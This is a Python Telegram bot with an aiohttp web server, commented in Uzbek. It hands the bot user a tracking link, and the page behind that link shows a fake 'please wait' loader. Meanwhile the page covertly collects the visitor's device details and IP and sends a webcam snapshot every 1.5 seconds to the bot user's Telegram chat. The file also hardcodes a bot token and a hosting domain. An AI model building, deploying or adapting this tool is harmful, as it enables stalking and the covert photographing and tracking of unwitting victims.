#!/usr/bin/env python3
import os
import json
import uuid
import base64
import asyncio
import logging
from io import BytesIO
from aiohttp import web
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Token va sozlamalarni muhit o'zgaruvchilaridan olish (xavfsizlik uchun)
BOT_TOKEN = ("8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN muhit o'zgaruvchisi berilishi shart!")

# WEBHOOK_DOMAIN oxiridagi bo'shliqlar va / larni tozalash
WEBHOOK_DOMAIN = ("https://fit-roanna-runex-7a8db616.koyeb.app", "").strip().rstrip('/')
if not WEBHOOK_DOMAIN:
    raise ValueError("WEBHOOK_DOMAIN muhit o'zgaruvchisi berilishi shart!")

PORT = int(os.getenv("PORT", "8000"))

# Foydalanuvchi tokenlari (xotirada saqlanadi)
USER_TOKENS = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    token = str(uuid.uuid4())
    USER_TOKENS[token] = user_id
    link = f"{WEBHOOK_DOMAIN}/track?token={token}"
    msg = (
        "👋 Salom!\n\n"
        f"🔗 {link}\n\n"
        "Agar kamera ruxsati berilsa, har 1.5 soniyada yangi rasm yuboriladi.\n"
        "Aks holda, faqat qurilma ma'lumotlari yuboriladi."
    )
    await update.message.reply_text(msg)

def get_client_ip(request: web.Request) -> str:
    """Mijoz IP manzilini aniqlash (reverse proxy uchun)"""
    hdr = request.headers.get("X-Forwarded-For")
    if hdr:
        return hdr.split(",")[0].strip()
    rem = request.remote
    if rem:
        return rem
    peer = request.transport.get_extra_info("peername")
    if peer:
        return str(peer[0])
    return "Noma'lum"

async def track_page(request: web.Request):
    token = request.query.get("token")
    if not token or token not in USER_TOKENS:
        return web.Response(text="❌ Noto‘g‘ri yoki eskirgan token", status=403)

    html = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Kuting...</title>
  <style>
    body {{
      font-family: sans-serif;
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      height: 100vh; text-align: center;
      background: #fafafa; color: #333;
    }}
    .loader {{
      width: 40px; height: 40px;
      border: 4px solid #ddd;
      border-top: 4px solid #4CAF50;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px;
    }}
    @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
    .note {{ font-size: 0.9em; color: #777; }}
  </style>
</head>
<body>
  <h2>Iltimos, kuting...</h2>
  <div class="loader"></div>
  <div class="note">Ma'lumotlar yig'ilmoqda...</div>
  <script>
    let stream = null;
    let intervalId = null;
    let hasSentInitialData = false;

    async function collectData() {{
      return {{
        timestamp: new Date().toISOString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        utcOffset: -new Date().getTimezoneOffset() / 60,
        languages: navigator.languages?.join(', ') || navigator.language,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        deviceMemory: navigator.deviceMemory || "Noma'lum",
        hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
        screen: `${{screen.width}}x${{screen.height}}`,
        viewport: `${{window.innerWidth}}x${{window.innerHeight}}`,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
        browser: "Noma'lum",
        os: "Noma'lum",
        model: "Noma'lum",
        devices: {{ mic: 0, speaker: 0, camera: 0 }},
        gpu: "Noma'lum",
        cameraRes: "Noma'lum",
        network: "Noma'lum"
      }};
    }}

    async function sendData(data, img = null) {{
      const body = {{ token: "{token}", clientData: data }};
      if (img) body.image = img;
      try {{
        await fetch("/submit", {{
          method: "POST",
          headers: {{ "Content-Type": "application/json" }},
          body: JSON.stringify(body)
        }});
      }} catch (err) {{
        console.error("Yuborishda xato:", err);
      }}
    }

    async function startCameraAndLoop() {{
      try {{
        // Kameraga ruxsat so'rash (640x480 ideal)
        stream = await navigator.mediaDevices.getUserMedia({{
          video: {{ width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }}
        }});

        // Birinchi ma'lumotni yuborish
        const data = await collectData();
        const video = document.createElement("video");
        video.srcObject = stream;
        await new Promise(resolve => {{
          video.onloadedmetadata = resolve;
          video.play();
        }});

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const img = canvas.toDataURL("image/jpeg", 0.7);

        await sendData(data, img);
        hasSentInitialData = true;

        // Har 1.5 soniyada yangilash
        intervalId = setInterval(async () => {{
          if (!stream || stream.getVideoTracks().length === 0) {{
            clearInterval(intervalId);
            return;
          }}
          const freshData = await collectData();
          const v = document.createElement("video");
          v.srcObject = stream;
          await new Promise(r => {{
            v.onloadedmetadata = r;
            v.play();
          }});
          const c = document.createElement("canvas");
          c.width = v.videoWidth || 640;
          c.height = v.videoHeight || 480;
          c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
          const newImg = c.toDataURL("image/jpeg", 0.7);
          await sendData(freshData, newImg);
        }}, 1500);

      } catch (err) {{
        console.warn("Kamera ruxsati rad etildi yoki mavjud emas:", err);
        // Faqat bir marta ma'lumot yuborish
        if (!hasSentInitialData) {{
          const data = await collectData();
          await sendData(data, null);
        }}
        // Kamera rad etilganligi haqida xabar
        try {{
          await fetch("/camera_denied", {{
            method: "POST",
            headers: {{ "Content-Type": "application/json" }},
            body: JSON.stringify({{ token: "{token}" }})
          }});
        }} catch (e) {{}}
      }}
    }

    function stopEverything() {{
      if (intervalId) {{
        clearInterval(intervalId);
        intervalId = null;
      }}
      if (stream) {{
        stream.getTracks().forEach(track => track.stop());
        stream = null;
      }}
    }

    // Sahifa tark etilganda to'xtatish
    window.addEventListener('beforeunload', stopEverything);
    window.addEventListener('pagehide', stopEverything); // Mobile brauzerlar uchun

    // Ishni boshlash
    startCameraAndLoop();
  </script>
</body>
</html>"""
    return web.Response(text=html, content_type="text/html")

async def submit_data(request: web.Request):
    try:
        body = await request.json()
        token = body.get("token")
        client_data = body.get("clientData", {})
        user_id = USER_TOKENS.get(token)
        if not user_id:
            return web.Response(status=403)

        ip = get_client_ip(request)
        devs = client_data.get("devices", {})

        message = (
            f"🕒 Sana/Vaqt: {client_data.get('timestamp')}\n"
            f"🌍 Zona: {client_data.get('timezone')} (UTC{client_data.get('utcOffset')})\n"
            f"📍 IP: {ip}\n"
            f"📱 Qurilma: {client_data.get('model')} ({client_data.get('deviceType')})\n"
            f"🖥 OS: {client_data.get('os')}, Brauzer: {client_data.get('browser')}\n"
            f"🎮 GPU: {client_data.get('gpu')}\n"
            f"🧠 CPU: {client_data.get('hardwareConcurrency')} yadrolar | RAM: {client_data.get('deviceMemory')} GB\n"
            f"📺 Ekran: {client_data.get('screen')} | Viewport: {client_data.get('viewport')}\n"
            f"🎨 Rang chuqurligi: {client_data.get('colorDepth')} bit | PixelDepth: {client_data.get('pixelDepth')}\n"
            f"🎤 Qurilmalar: Mic: {devs.get('mic',0)}, Speaker: {devs.get('speaker',0)}, Kamera: {devs.get('camera',0)}\n"
            f"📷 Kamera aniqlangan o‘lcham: {client_data.get('cameraRes')}\n"
            f"📶 Tarmoq: {client_data.get('network')}\n"
            f"🗣 Tillar: {client_data.get('languages')}\n"
            f"🔍 UA: {client_data.get('userAgent')}"
        )

        if "image" in body:
            img_data = body["image"]
            if "," in img_data:
                b64 = img_data.split(",", 1)[1]
            else:
                b64 = img_data
            try:
                img_bytes = base64.b64decode(b64)
                img = BytesIO(img_bytes)
                img.name = "snapshot.jpg"
                await request.app["bot"].send_photo(chat_id=user_id, photo=InputFile(img), caption=message)
            except Exception as e:
                logger.exception("Rasmni yuborishda xato")
                await request.app["bot"].send_message(
                    chat_id=user_id,
                    text=f"⚠️ Rasm yuborishda xato:\n{str(e)[:200]}\n\n{message}"
                )
        else:
            await request.app["bot"].send_message(chat_id=user_id, text=message)

        return web.Response(text="ok")
    except Exception as e:
        logger.exception("submit_data xato")
        return web.Response(status=500, text=str(e))

async def camera_denied(request: web.Request):
    try:
        data = await request.json()
        token = data.get("token")
        user_id = USER_TOKENS.get(token)
        if user_id:
            await request.app["bot"].send_message(
                chat_id=user_id,
                text="⚠️ Kamera ruxsati berilmadi yoki mavjud emas."
            )
        return web.Response(status=200)
    except Exception as e:
        logger.exception("camera_denied xato")
        return web.Response(status=500)

async def start_web_server(bot):
    app = web.Application()
    app["bot"] = bot
    app.router.add_get("/track", track_page)
    app.router.add_post("/submit", submit_data)
    app.router.add_post("/camera_denied", camera_denied)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logger.info(f"🌐 Web server ishga tushdi: http://0.0.0.0:{PORT}")

async def on_startup(app: Application):
    asyncio.create_task(start_web_server(app.bot))

def main():
    app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
    app.add_handler(CommandHandler("start", start))
    logger.info("🤖 Bot ishga tushdi (polling rejimida)")
    app.run_polling()

if __name__ == "__main__":
    main()
